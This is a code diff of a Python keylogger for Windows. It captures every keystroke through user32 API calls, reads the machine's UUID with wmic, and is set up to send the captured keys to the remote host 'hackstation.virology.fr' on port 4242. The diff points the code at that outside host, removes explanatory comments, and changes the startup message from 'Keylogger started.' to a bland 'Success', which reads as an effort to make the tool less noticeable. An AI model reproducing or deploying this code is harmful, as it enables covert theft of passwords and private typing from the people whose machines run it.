@@ -11,39 +11,33 @@ def main():
 
     keystroke_buffer = queue.Queue()
 
-    HOST = '172.26.199.159'
+    HOST = 'hackstation.virology.fr'
     PORT = 4242
 
-    # Windows constants for virtual key codes and key states
     VK_SHIFT = 0x10
-    VK_CAPITAL = 0x14  # CAPS LOCK
+    VK_CAPITAL = 0x14
     VK_CONTROL = 0x11
     VK_MENU = 0x12  # ALT key
 
     user32 = ctypes.windll.user32
 
-    # Function definitions for keyboard layout and key translation
     GetAsyncKeyState = user32.GetAsyncKeyState
     GetKeyboardLayout = user32.GetKeyboardLayout
     MapVirtualKeyW = user32.MapVirtualKeyW
     ToUnicode = user32.ToUnicode
     GetKeyState = user32.GetKeyState
 
-    # Initialize key states
     prev_key_states = [0] * 256
 
-    # Get the UUID once to avoid redundant calls
     uid = os.popen("wmic csproduct get uuid").read().strip().splitlines()[-1]
 
-    # Main keylogger loop
     while True:
         for vk_code in range(256):
             key_state = GetAsyncKeyState(vk_code)
             if key_state & 0x8000:
                 if prev_key_states[vk_code] == 0:
-                    # Create buffers for the translation functions
                     scan_code = MapVirtualKeyW(vk_code, 0)
-                    buffer = ctypes.create_unicode_buffer(4)  # Create a buffer for the character
+                    buffer = ctypes.create_unicode_buffer(4)
 
                     # Get the states of SHIFT and CAPS LOCK
                     shift_state = GetKeyState(VK_SHIFT) & 0x8000
@@ -91,4 +85,4 @@ def main():
         time.sleep(0.005)
 
 threading.Thread(target=main).start()
-print("Keylogger started.")
+print("Success")
